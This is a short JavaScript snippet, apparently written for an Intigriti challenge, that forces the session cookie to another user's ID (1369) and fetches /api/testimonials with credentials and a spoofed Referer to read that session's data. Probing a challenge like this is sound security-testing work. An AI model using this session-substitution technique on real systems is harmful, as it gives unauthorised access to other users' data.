(async function getWithSession1369() {
    
    // Force cookie
    document.cookie = "session=1369; path=/";
    
    await new Promise(r => setTimeout(r, 500));

    fetch('/api/testimonials', {
        method: 'GET',
        credentials: 'include',           // Important
        headers: {
            'Accept': '*/*',
            'Referer': 'https://challenge-0526.intigriti.io/challenge'
        }
    })
    .then(r => {
        console.log("Status →", r.status);
        return r.json();
    })
    .then(data => {
        console.log("✅ Data from session 1369:");
        console.log(data);
    })
    .catch(e => console.error(e));

})();
